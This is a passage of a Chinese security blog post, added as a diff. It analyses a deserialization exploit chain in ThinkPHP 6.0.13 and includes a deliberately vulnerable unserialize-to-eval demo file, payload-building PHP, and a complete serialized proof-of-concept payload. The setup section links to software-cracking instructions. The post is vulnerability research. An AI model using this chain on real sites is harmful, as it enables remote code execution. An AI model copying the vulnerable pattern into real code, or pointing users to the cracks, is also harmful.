@@ -1,0 +1,213 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>ThinkPHP最新版6-0-13-0day利用链分析 | 卡卡罗特取西经</title><meta name="author" content="ybdt"><meta name="copyright" content="ybdt"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="0x01 ThinkPHP版本梳理截止到2022年10月17日6.0.x系列最新版是V6.0.13（2022年07月15日发布）5.1.x系列最新版是V5.1.41（2021年01月12日发布）5.0.x系列最新版是V5.0.24（2019年01月11日发布）   作者在2019年02月14日发布V5.2 RC1后，没有再发布过V5.2系列，而是在2019年04月22日发布V6.0.0 RC2，看">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ThinkPHP最新版6-0-13-0day利用链分析">
+<meta property="og:url" content="http://example.com/2024/04/22/ThinkPHP%E6%9C%80%E6%96%B0%E7%89%886-0-13-0day%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="卡卡罗特取西经">
+<meta property="og:description" content="0x01 ThinkPHP版本梳理截止到2022年10月17日6.0.x系列最新版是V6.0.13（2022年07月15日发布）5.1.x系列最新版是V5.1.41（2021年01月12日发布）5.0.x系列最新版是V5.0.24（2019年01月11日发布）   作者在2019年02月14日发布V5.2 RC1后，没有再发布过V5.2系列，而是在2019年04月22日发布V6.0.0 RC2，看">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png">
+<meta property="article:published_time" content="2024-04-22T11:53:08.000Z">
+<meta property="article:modified_time" content="2024-04-22T12:13:52.660Z">
+<meta property="article:author" content="ybdt">
+<meta property="article:tag" content="代码审计">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2024/04/22/ThinkPHP%E6%9C%80%E6%96%B0%E7%89%886-0-13-0day%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Error',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'ThinkPHP最新版6-0-13-0day利用链分析',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-04-22 20:13:52'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="卡卡罗特取西经" type="application/atom+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">5</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><hr class="custom-hr"/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="卡卡罗特取西经"><span class="site-name">卡卡罗特取西经</span></a></span><div id="menus"><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">ThinkPHP最新版6-0-13-0day利用链分析</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2024-04-22T11:53:08.000Z" title="Created 2024-04-22 19:53:08">2024-04-22</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2024-04-22T12:13:52.660Z" title="Updated 2024-04-22 20:13:52">2024-04-22</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="ThinkPHP最新版6-0-13-0day利用链分析"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="0x01-ThinkPHP版本梳理"><a href="#0x01-ThinkPHP版本梳理" class="headerlink" title="0x01 ThinkPHP版本梳理"></a>0x01 ThinkPHP版本梳理</h1><p>截止到2022年10月17日<br>6.0.x系列最新版是V6.0.13（2022年07月15日发布）<br>5.1.x系列最新版是V5.1.41（2021年01月12日发布）<br>5.0.x系列最新版是V5.0.24（2019年01月11日发布）  </p>
+<p>作者在2019年02月14日发布V5.2 RC1后，没有再发布过V5.2系列，而是在2019年04月22日发布V6.0.0 RC2，看样子V6.0系列接替了V5.2系列</p>
+<p>thinkphp6及以上，安装需要使用composer</p>
+<h1 id="0x02-Mac下PHP集成环境踩坑"><a href="#0x02-Mac下PHP集成环境踩坑" class="headerlink" title="0x02 Mac下PHP集成环境踩坑"></a>0x02 Mac下PHP集成环境踩坑</h1><p>php集成环境，之前在windows下用phpstudy，自从换了mac，什么都要重新来。。</p>
+<p>首选使用破解版MAMP Pro，但我这边下载后安装报错（后经查阅，安装破解版MAMP Pro可能需要关闭SIP，SIP即macOS的一种保护机制），不想关闭SIP，放弃这个方案，也试过MAMP免费版，但不支持切换php版本，这个不能忍，尝试phpstudy mac版，发现phpstudy mac版支持切换php版本，其他功能界面也和phpstudy windows版基本一致，就用它了</p>
+<p>具体使用phpstudy mac版后发现，启动phpstudy mac版内置的php解释器报错，提示找不到redis.so库，在php.ini中注释掉redis.so库可解决此提醒，but，使用phpstudy内置的php下载composer时又报错，提示缺少openssl库，此时需要自己编译openssl库，太麻烦了，干脆换一个php集成环境吧，找来找去，发现MAMP免费版也可以切换php版本（需要一个小技巧，后面会提到），下载后尝试用内置的php下载安装composer，成功安装composer，OK，就用它了</p>
+<p>mamp免费版切换php版本技巧，进入mamp下php安装目录，由于mamp默认会不显示后面加_x的版本，所以可将其他版本改个名字来切换版本，如下图<br><img src="/2024/04/22/ThinkPHP%E6%9C%80%E6%96%B0%E7%89%886-0-13-0day%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20221019105719682.png" alt="image-20221019105719682"></p>
+<h1 id="0x03-Mac下ThinkPHP调试环境踩坑"><a href="#0x03-Mac下ThinkPHP调试环境踩坑" class="headerlink" title="0x03 Mac下ThinkPHP调试环境踩坑"></a>0x03 Mac下ThinkPHP调试环境踩坑</h1><p>php开发环境，使用phpstorm 2021.1.4，破解方式参考：<a target="_blank" rel="noopener" href="https://github.com/ybdt/pentest-hub/tree/main/%E5%A6%82%E4%BD%95%E6%94%BE%E5%BF%83%E7%9A%84%E7%99%BD%E5%AB%96%E5%9B%9B%E5%A4%A7%E4%B8%BB%E6%B5%81%E8%AF%AD%E8%A8%80IDE">https://github.com/ybdt/pentest-hub/tree/main/如何放心的白嫖四大主流语言IDE</a></p>
+<p>安装composer，参考：<a target="_blank" rel="noopener" href="https://getcomposer.org/download/">https://getcomposer.org/download/</a></p>
+<p>在mamp的对应php目录下安装composer，然后创建到/usr/local/bin的软连接，创建软连接后，可从任意位置执行composer及php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ln -s /Applications/MAMP/bin/php/php7.1.33/bin/composer.phar /usr/local/bin/composer</span><br><span class="line"></span><br><span class="line">ln -s /Applications/MAMP/bin/php/php7.1.33/bin/php /usr/local/bin/php</span><br></pre></td></tr></table></figure>
+
+<p>安装指定版本的thinkphp框架</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project topthink/think tp5.0 5.0.24</span><br></pre></td></tr></table></figure>
+<p>我这边composer版本是2.2.18，不是最新版2.4.3，想使用composer安装thinkphp6的最新版6.0.13会提示找不到，可是php7.1安装composer最高版本只能是2.2.18，于是改用php7.4安装composer，成功安装到composer 2.4.3，再用composer 2.4.3安装thinkphp 6.0.13，成功安装，真是一波三折，如下图<br><img src="/2024/04/22/ThinkPHP%E6%9C%80%E6%96%B0%E7%89%886-0-13-0day%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20221019155233012.png" alt="image-20221019155233012"></p>
+<p>然后是php调试环境，mac下想安装xdebug需要先通过homebrew安装php，然后通过pecl安装xdebug，可是这样只能安装php版本对应的xdebug，不能安装指定版本的xdebug，有点烦~</p>
+<p>可从<a href="%5Bhttps://xdebug.org/wizard">https://xdebug.org/wizard</a>中查询当前php版本需要哪个版本的xdebug，结果按照指令安装的时候，发现缺少phpize，官方文档并没有讲述mac下缺少phpize该如何安装，google后发现可能需要编译安装，太麻烦了，想想别的办法，猛地发现，mamp的如下目录自带了编译好的xdebug</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/Applications/MAMP/bin/php/php7.4.21/lib/php/extensions/no-debug-non-zts-20190902</span><br></pre></td></tr></table></figure>
+
+<p>不得不说，集成环境真香~</p>
+<p>修改php.ini，增加如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[xdebug]</span><br><span class="line">zend_extension=&quot;/Applications/MAMP/bin/php/php7.4.21/lib/php/extensions/no-debug-non-zts-20190902/xdebug.so&quot;</span><br><span class="line">xdebug.remote_enable=1</span><br><span class="line">xdebug.remote_autostart=on</span><br><span class="line">xdebug.remote_log=&quot;/var/log/xdebug.log&quot;</span><br><span class="line">xdebug.remote_port=9000</span><br><span class="line">xdebug.remote_handler=&quot;dbgp&quot;</span><br><span class="line">xdebug.idekey=&quot;PhpStorm&quot;</span><br></pre></td></tr></table></figure>
+<p>成功安装了xdebug，如下图<br><img src="/2024/04/22/ThinkPHP%E6%9C%80%E6%96%B0%E7%89%886-0-13-0day%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20221020001654994.png" alt="image-20221020001654994"></p>
+<p>Phpstorm配置过程参见：<a target="_blank" rel="noopener" href="https://juejin.cn/post/6934614190548221960">https://juejin.cn/post/6934614190548221960</a></p>
+<p>配置好后，如下图启动<br><img src="/2024/04/22/ThinkPHP%E6%9C%80%E6%96%B0%E7%89%886-0-13-0day%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20221020094716570.png" alt="image-20221020095242692"></p>
+<p>能看到网页访问停在了断点处<br><img src="/2024/04/22/ThinkPHP%E6%9C%80%E6%96%B0%E7%89%886-0-13-0day%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20221020094821384.png" alt="image-20221020094821384"></p>
+<p>程序执行停在了断点处<br><img src="/2024/04/22/ThinkPHP%E6%9C%80%E6%96%B0%E7%89%886-0-13-0day%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20221020095242692.png" alt="image-20221020095242692"></p>
+<h1 id="0x04-PHP反序列化漏洞及POP链复习"><a href="#0x04-PHP反序列化漏洞及POP链复习" class="headerlink" title="0x04 PHP反序列化漏洞及POP链复习"></a>0x04 PHP反序列化漏洞及POP链复习</h1><p>PHP反序列化漏洞原理：服务端在处理用户传入的序列化数据时，需要调用unserialize()，php中调用unserialize()会触发魔法方法<code>__wakekup()</code>、<code>__destruct()</code>，如果魔法方法中包含了危险函数或间接包含危险函数，则攻击者可构造恶意的序列化数据，在服务端反序列化的时候造成危险函数的执行，</p>
+<p>PHP反序列化POP链原理：由于类反序列化后只包含属性不包含方法，也就是说我们构造的序列化数据只能操纵类的属性，不能操纵方法，只能通过自动调用魔法方法来调用方法，这个时候如果魔法方法中不是直接包含危险函数，就需要向上回溯，一层一层跟踪，也就是所谓的POP链，通常是寻找包含危险函数的同名方法、或者更复杂的，触发各种魔法方法，最终调用危险函数</p>
+<p>详细讲解可参考：<br><a target="_blank" rel="noopener" href="https://johnfrod.top/%E5%AE%89%E5%85%A8/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">https://johnfrod.top/安全/php反序列化漏洞总结/</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/bmjoker/p/13742666.html">https://www.cnblogs.com/bmjoker/p/13742666.html</a></p>
+<p>如下是一个存在反序列化漏洞的文件vuln1.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">class Demo &#123;</span><br><span class="line">    var $test;</span><br><span class="line">    </span><br><span class="line">    function __construct() &#123;</span><br><span class="line">        $this-&gt;test = new L();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    function __destruct() &#123;</span><br><span class="line">        $this-&gt;test-&gt;action();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">class L &#123;</span><br><span class="line">    function action() &#123;</span><br><span class="line">        echo &quot;function action() in class L&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">class Evil &#123;</span><br><span class="line">    var $test2;</span><br><span class="line">    </span><br><span class="line">    function action() &#123;</span><br><span class="line">        eval($this-&gt;test2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">unserialize($_GET[&#x27;test&#x27;]);</span><br></pre></td></tr></table></figure>
+
+<p>由上述Demo可知，如果构造一个Demo类，里面实例化的是类Evil，反序列化时自动调用<code>__destruct()</code>，<code>__destruct()</code>中调用action()，action()中调用危险函数eval，则最终导致代码执行，同时不要忘记将恶意代码赋值给$test2，payload如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">class Demo &#123;</span><br><span class="line">    var $test;</span><br><span class="line"></span><br><span class="line">    function __construct() &#123;</span><br><span class="line">        $this-&gt;test = new Evil();</span><br><span class="line">        $this-&gt;test-&gt;test2 = &quot;phpinfo();&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct() &#123;</span><br><span class="line">        $this-&gt;test-&gt;action();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Evil &#123;</span><br><span class="line">    var $test2;</span><br><span class="line"></span><br><span class="line">    function action()&#123;</span><br><span class="line">        eval($this-&gt;test2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$d = new demo();</span><br><span class="line">$data = serialize($d);</span><br><span class="line">echo $data;</span><br><span class="line"></span><br><span class="line">//上述输出</span><br><span class="line">//O:4:&quot;Demo&quot;:1:&#123;s:4:&quot;test&quot;;O:4:&quot;Evil&quot;:1:&#123;s:5:&quot;test2&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>将上述序列化的输出传给vuln1.php，执行结果如下图</p>
+<p><img src="/2024/04/22/ThinkPHP%E6%9C%80%E6%96%B0%E7%89%886-0-13-0day%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20221021113505973.png" alt="image-20221021113505973"></p>
+<h1 id="0x05-ThinkPHP框架复习"><a href="#0x05-ThinkPHP框架复习" class="headerlink" title="0x05 ThinkPHP框架复习"></a>0x05 ThinkPHP框架复习</h1><p>网站搭建好后，我们会访问：<a target="_blank" rel="noopener" href="http://localhost:8888/tp6.0.13/public/index.php">http://localhost:8888/tp6.0.13/public/index.php</a>，其实这里的index.php并不是访问的内容，而是一个类似路由的文件，会请求分发到app/controller/Index.php中的方法index，可以看到其内容也是首页中出现的内容<br><img src="/2024/04/22/ThinkPHP%E6%9C%80%E6%96%B0%E7%89%886-0-13-0day%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20221021151524589.png" alt="image-20221021151524589"></p>
+<p>我们对方法index做个修改<br><img src="/2024/04/22/ThinkPHP%E6%9C%80%E6%96%B0%E7%89%886-0-13-0day%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20221021151908240.png" alt="image-20221021151908240"></p>
+<p>可以看到，首页内容也发生了修改<br><img src="/2024/04/22/ThinkPHP%E6%9C%80%E6%96%B0%E7%89%886-0-13-0day%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20221021151946085.png" alt="image-20221021151946085"></p>
+<p>其实访问 <a target="_blank" rel="noopener" href="http://localhost:8888/tp6.0.13/public/index.php">http://localhost:8888/tp6.0.13/public/index.php</a> 相当于访问 <a target="_blank" rel="noopener" href="http://localhost:8888/tp6.0.13/public/index.php/Index/index">http://localhost:8888/tp6.0.13/public/index.php/Index/index</a> ，只不过不加的时候，类Index和方法index是作为默认值，如果要访问其他方法，改为其他方法即可</p>
+<p><img src="/2024/04/22/ThinkPHP%E6%9C%80%E6%96%B0%E7%89%886-0-13-0day%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20221021152514296.png" alt="image-20221021152514296"></p>
+<p>详细讲解可参考：<br><a target="_blank" rel="noopener" href="https://www.kancloud.cn/manual/thinkphp6_0/1037485">https://www.kancloud.cn/manual/thinkphp6_0/1037485</a><br><a target="_blank" rel="noopener" href="https://www.kancloud.cn/manual/thinkphp6_0/1037494">https://www.kancloud.cn/manual/thinkphp6_0/1037494</a></p>
+<h1 id="0x06-ThinkPHP最新版6-0-13-0day利用链分析"><a href="#0x06-ThinkPHP最新版6-0-13-0day利用链分析" class="headerlink" title="0x06 ThinkPHP最新版6.0.13 0day利用链分析"></a>0x06 ThinkPHP最新版6.0.13 0day利用链分析</h1><p>截止到2022年10月17日，thinkphp 6.0.x系列最新版是V6.0.13（2022年07月15日发布），08月14日有人提交了一个反序列化利用链，是一个目前尚未修复的0day，下面对它进行一波分析</p>
+<p>先用如下poc打一遍</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">namespace League\Flysystem\Cached\Storage&#123;</span><br><span class="line">    class Psr6Cache&#123;</span><br><span class="line">          private $pool;</span><br><span class="line">          protected $autosave = false;</span><br><span class="line">          public function __construct($exp)</span><br><span class="line">&#123;</span><br><span class="line">              $this-&gt;pool = $exp;</span><br><span class="line">          &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace think\log&#123;</span><br><span class="line">      class Channel&#123;</span><br><span class="line">          protected $logger;</span><br><span class="line">          protected $lazy = true;</span><br><span class="line">          public function __construct($exp)</span><br><span class="line">&#123;</span><br><span class="line">               $this-&gt;logger = $exp;</span><br><span class="line">               $this-&gt;lazy = false;</span><br><span class="line">          &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace think&#123;</span><br><span class="line">      class Request&#123;</span><br><span class="line">          protected $url;</span><br><span class="line">          public function __construct()</span><br><span class="line">&#123;</span><br><span class="line">              $this-&gt;url = &#x27;&lt;?php phpinfo(); ?&gt;&#x27;;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      class App&#123;</span><br><span class="line">            protected $instances = [];</span><br><span class="line">            public function __construct()</span><br><span class="line">&#123;</span><br><span class="line">                $this-&gt;instances = [&#x27;think\Request&#x27;=&gt;new Request()];</span><br><span class="line">            &#125;</span><br><span class="line">       &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace think\view\driver&#123;</span><br><span class="line">      class Php&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace think\log\driver&#123;</span><br><span class="line">      class Socket&#123;</span><br><span class="line">            protected $config = [];</span><br><span class="line">            protected $app;</span><br><span class="line">            protected $clientArg = [];</span><br><span class="line">            public function __construct()</span><br><span class="line">            &#123;</span><br><span class="line">               $this-&gt;config = [</span><br><span class="line">                  &#x27;debug&#x27;=&gt;true,</span><br><span class="line">                  &#x27;force_client_ids&#x27; =&gt; 1,</span><br><span class="line">                  &#x27;allow_client_ids&#x27; =&gt; &#x27;&#x27;,</span><br><span class="line">                  &#x27;format_head&#x27; =&gt; [new \think\view\driver\Php,&#x27;display&#x27;], # 利用类和方法</span><br><span class="line">               ];</span><br><span class="line">               $this-&gt;app = new \think\App();</span><br><span class="line">               $this-&gt;clientArg = [&#x27;tabid&#x27;=&gt;&#x27;1&#x27;];</span><br><span class="line">            &#125;</span><br><span class="line">       &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace&#123;</span><br><span class="line">    $c = new think\log\driver\Socket();</span><br><span class="line">    $b = new think\log\Channel($c);</span><br><span class="line">    $a = new League\Flysystem\Cached\Storage\Psr6Cache($b);</span><br><span class="line">    echo urlencode(serialize($a));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//输出如下</span><br><span class="line">O%3A41%3A%22League%5CFlysystem%5CCached%5CStorage%5CPsr6Cache%22%3A2%3A%7Bs%3A47%3A%22%00League%5CFlysystem%5CCached%5CStorage%5CPsr6Cache%00pool%22%3BO%3A17%3A%22think%5Clog%5CChannel%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00logger%22%3BO%3A23%3A%22think%5Clog%5Cdriver%5CSocket%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00config%22%3Ba%3A4%3A%7Bs%3A5%3A%22debug%22%3Bb%3A1%3Bs%3A16%3A%22force_client_ids%22%3Bi%3A1%3Bs%3A16%3A%22allow_client_ids%22%3Bs%3A0%3A%22%22%3Bs%3A11%3A%22format_head%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A21%3A%22think%5Cview%5Cdriver%5CPhp%22%3A0%3A%7B%7Di%3A1%3Bs%3A7%3A%22display%22%3B%7D%7Ds%3A6%3A%22%00%2A%00app%22%3BO%3A9%3A%22think%5CApp%22%3A1%3A%7Bs%3A12%3A%22%00%2A%00instances%22%3Ba%3A1%3A%7Bs%3A13%3A%22think%5CRequest%22%3BO%3A13%3A%22think%5CRequest%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00url%22%3Bs%3A19%3A%22%3C%3Fphp+phpinfo%28%29%3B+%3F%3E%22%3B%7D%7D%7Ds%3A12%3A%22%00%2A%00clientArg%22%3Ba%3A1%3A%7Bs%3A5%3A%22tabid%22%3Bs%3A1%3A%221%22%3B%7D%7Ds%3A7%3A%22%00%2A%00lazy%22%3Bb%3A0%3B%7Ds%3A11%3A%22%00%2A%00autosave%22%3Bb%3A0%3B%7D</span><br></pre></td></tr></table></figure>
+
+<p>传入payload，如下图</p>
